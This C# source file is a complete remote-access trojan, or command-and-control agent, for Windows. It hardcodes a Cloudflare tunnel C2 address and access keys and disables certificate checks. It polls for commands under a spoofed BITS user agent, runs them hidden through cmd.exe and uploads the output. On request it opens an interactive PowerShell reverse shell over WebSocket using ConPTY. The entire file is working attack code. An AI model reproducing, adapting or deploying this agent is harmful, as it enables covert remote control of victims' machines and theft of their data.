using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

// .NET Framework 4.8 C2 Agent - ConPTY + BITS + WebSocket
// Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /optimize+ /out:agent.exe Agent.cs

class Agent
{
    // ============ C2 CONFIG ============
    const string C2_URL = "https://paint-jail-husband-pharmacology.trycloudflare.com";
    const string API_KEY = "220c43145f71479bf551dcd8cb52d9fa";
    const string PAYLOAD_TOKEN = "31cf3801cde3f2198dd792f129e8fa5c";
    // ===================================

    static string agentId = "";
    static bool ptyRunning = false;
    static readonly object ptyLock = new object();
    static JavaScriptSerializer json = new JavaScriptSerializer();

    // ==================== KERNEL32 P/Invoke ====================
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr CreateMutexW(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

    [DllImport("kernel32.dll")]
    static extern uint GetLastError();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool PeekNamedPipe(IntPtr hNamedPipe, IntPtr lpBuffer, uint nBufferSize, IntPtr lpBytesRead, out uint lpTotalBytesAvail, IntPtr lpBytesLeftThisMessage);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern int ResizePseudoConsole(IntPtr hPC, COORD size);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void ClosePseudoConsole(IntPtr hPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const int PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    const uint WAIT_TIMEOUT = 258;
    const uint ERROR_ALREADY_EXISTS = 183;

    [StructLayout(LayoutKind.Sequential)]
    struct COORD { public short X, Y; }

    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    // ConPTY wrapper
    class ConPty : IDisposable
    {
        public IntPtr hPC, pipeIn, pipeOut, hProcess, hThread;

        public static ConPty Create(short cols, short rows)
        {
            var sa = new SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)), bInheritHandle = true };
            IntPtr pipeInRead, pipeInWrite, pipeOutRead, pipeOutWrite;

            if (!CreatePipe(out pipeInRead, out pipeInWrite, ref sa, 0)) return null;
            if (!CreatePipe(out pipeOutRead, out pipeOutWrite, ref sa, 0)) { CloseHandle(pipeInRead); CloseHandle(pipeInWrite); return null; }

            IntPtr hPC;
            var size = new COORD { X = cols, Y = rows };
            int hr = CreatePseudoConsole(size, pipeInRead, pipeOutWrite, 0, out hPC);
            CloseHandle(pipeInRead);
            CloseHandle(pipeOutWrite);

            if (hr != 0) { CloseHandle(pipeInWrite); CloseHandle(pipeOutRead); return null; }

            // Setup attribute list
            IntPtr attrSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);
            IntPtr attrList = Marshal.AllocHGlobal(attrSize);
            if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize))
            {
                Marshal.FreeHGlobal(attrList);
                ClosePseudoConsole(hPC);
                CloseHandle(pipeInWrite);
                CloseHandle(pipeOutRead);
                return null;
            }

            IntPtr hPCPtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(hPCPtr, hPC);
            if (!UpdateProcThreadAttribute(attrList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
            {
                DeleteProcThreadAttributeList(attrList);
                Marshal.FreeHGlobal(attrList);
                Marshal.FreeHGlobal(hPCPtr);
                ClosePseudoConsole(hPC);
                CloseHandle(pipeInWrite);
                CloseHandle(pipeOutRead);
                return null;
            }

            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
            si.lpAttributeList = attrList;

            PROCESS_INFORMATION pi;
            var cmd = new StringBuilder("powershell.exe -NoLogo -NoProfile");
            if (!CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi))
            {
                DeleteProcThreadAttributeList(attrList);
                Marshal.FreeHGlobal(attrList);
                Marshal.FreeHGlobal(hPCPtr);
                ClosePseudoConsole(hPC);
                CloseHandle(pipeInWrite);
                CloseHandle(pipeOutRead);
                return null;
            }

            DeleteProcThreadAttributeList(attrList);
            Marshal.FreeHGlobal(attrList);
            Marshal.FreeHGlobal(hPCPtr);

            return new ConPty { hPC = hPC, pipeIn = pipeInWrite, pipeOut = pipeOutRead, hProcess = pi.hProcess, hThread = pi.hThread };
        }

        public int Read(byte[] buf)
        {
            uint avail;
            if (!PeekNamedPipe(pipeOut, IntPtr.Zero, 0, IntPtr.Zero, out avail, IntPtr.Zero) || avail == 0) return 0;
            uint read;
            if (!ReadFile(pipeOut, buf, Math.Min((uint)buf.Length, avail), out read, IntPtr.Zero)) return -1;
            return (int)read;
        }

        public bool Write(byte[] data)
        {
            uint written;
            return WriteFile(pipeIn, data, (uint)data.Length, out written, IntPtr.Zero);
        }

        public bool IsAlive() => WaitForSingleObject(hProcess, 0) == WAIT_TIMEOUT;

        public void Resize(short cols, short rows) => ResizePseudoConsole(hPC, new COORD { X = cols, Y = rows });

        public void Dispose()
        {
            ClosePseudoConsole(hPC);
            CloseHandle(pipeIn);
            CloseHandle(pipeOut);
            CloseHandle(hProcess);
            CloseHandle(hThread);
        }
    }

    static void Main()
    {
        // Single instance mutex
        string mutexName = "Global\\Agent_" + PAYLOAD_TOKEN.Substring(0, 8);
        CreateMutexW(IntPtr.Zero, false, mutexName);
        if (GetLastError() == ERROR_ALREADY_EXISTS) return;

        ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        string hostname = Environment.MachineName;
        var rnd = new Random();
        agentId = hostname + "-" + rnd.Next(1, 999).ToString("x4");

        string cmdUrl = C2_URL + "/bits/cmd/" + agentId + "?key=" + PAYLOAD_TOKEN;
        string resultUrl = C2_URL + "/bits/result/" + agentId + "?key=" + PAYLOAD_TOKEN;
        string ptyStatusUrl = C2_URL + "/bits/pty-status/" + agentId;

        while (true)
        {
            try
            {
                // Check PTY request
                using (var wc = new WebClient())
                {
                    wc.Headers["X-API-Key"] = API_KEY;
                    string ptyResp = wc.DownloadString(ptyStatusUrl);
                    if (ptyResp.Contains("true")) StartPtySession();
                }
            }
            catch { }

            try
            {
                // Check BITS commands
                using (var wc = new WebClient())
                {
                    wc.Headers["X-API-Key"] = API_KEY;
                    wc.Headers["User-Agent"] = "Microsoft BITS/7.8";
                    string resp = wc.DownloadString(cmdUrl);

                    string cmd = "";
                    try
                    {
                        var dict = json.Deserialize<System.Collections.Generic.Dictionary<string, object>>(resp);
                        if (dict != null && dict.ContainsKey("command")) cmd = dict["command"]?.ToString() ?? "";
                    }
                    catch { cmd = resp.Trim(); }

                    if (!string.IsNullOrEmpty(cmd))
                    {
                        string result = ExecuteCommand(cmd);
                        wc.Headers["Content-Type"] = "application/json";
                        wc.UploadString(resultUrl, json.Serialize(new { result = result }));
                    }
                }
            }
            catch { }

            Thread.Sleep(5000);
        }
    }

    static string ExecuteCommand(string cmd)
    {
        try
        {
            var psi = new ProcessStartInfo("cmd.exe", "/C " + cmd)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit(30000);
                return string.IsNullOrEmpty(error) ? output : output + "\n" + error;
            }
        }
        catch (Exception ex) { return "Error: " + ex.Message; }
    }

    static void StartPtySession()
    {
        lock (ptyLock)
        {
            if (ptyRunning) return;
            ptyRunning = true;
        }
        new Thread(() => RunPtyWebSocket()) { IsBackground = true }.Start();
    }

    static async void RunPtyWebSocket()
    {
        try
        {
            string wsUrl = C2_URL.Replace("https://", "wss://").Replace("http://", "ws://") + "/tty/" + agentId;
            using (var ws = new ClientWebSocket())
            {
                // SSL validation is handled globally via ServicePointManager
                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);

                // Send role
                byte[] roleMsg = Encoding.UTF8.GetBytes("{\"role\":\"agent\"}");
                await ws.SendAsync(new ArraySegment<byte>(roleMsg), WebSocketMessageType.Text, true, CancellationToken.None);

                using (var pty = ConPty.Create(120, 30))
                {
                    if (pty == null)
                    {
                        byte[] errMsg = Encoding.UTF8.GetBytes("ConPTY creation failed\r\n");
                        await ws.SendAsync(new ArraySegment<byte>(errMsg), WebSocketMessageType.Text, true, CancellationToken.None);
                        return;
                    }

                    byte[] banner = Encoding.UTF8.GetBytes("=== ConPTY " + Environment.MachineName + " ===\r\n");
                    await ws.SendAsync(new ArraySegment<byte>(banner), WebSocketMessageType.Text, true, CancellationToken.None);

                    var recvBuf = new byte[4096];
                    var ptyBuf = new byte[4096];

                    while (ws.State == WebSocketState.Open && pty.IsAlive())
                    {
                        // Read from PTY, send to WebSocket
                        int n = pty.Read(ptyBuf);
                        if (n > 0)
                        {
                            await ws.SendAsync(new ArraySegment<byte>(ptyBuf, 0, n), WebSocketMessageType.Text, true, CancellationToken.None);
                        }

                        // Read from WebSocket with timeout
                        var recvTask = ws.ReceiveAsync(new ArraySegment<byte>(recvBuf), CancellationToken.None);
                        if (await Task.WhenAny(recvTask, Task.Delay(50)) == recvTask)
                        {
                            var result = recvTask.Result;
                            if (result.MessageType == WebSocketMessageType.Close) break;
                            if (result.Count > 0)
                            {
                                string input = Encoding.UTF8.GetString(recvBuf, 0, result.Count);
                                if (input == "ping") continue;
                                if (input.StartsWith("{\"resize\":"))
                                {
                                    try
                                    {
                                        var dict = json.Deserialize<System.Collections.Generic.Dictionary<string, object>>(input);
                                        if (dict.ContainsKey("resize"))
                                        {
                                            var arr = dict["resize"] as System.Collections.ArrayList;
                                            if (arr != null && arr.Count == 2)
                                                pty.Resize(Convert.ToInt16(arr[0]), Convert.ToInt16(arr[1]));
                                        }
                                    }
                                    catch { }
                                    continue;
                                }
                                pty.Write(Encoding.UTF8.GetBytes(input));
                            }
                        }
                    }
                }
            }
        }
        catch { }
        finally
        {
            lock (ptyLock) { ptyRunning = false; }
        }
    }
}
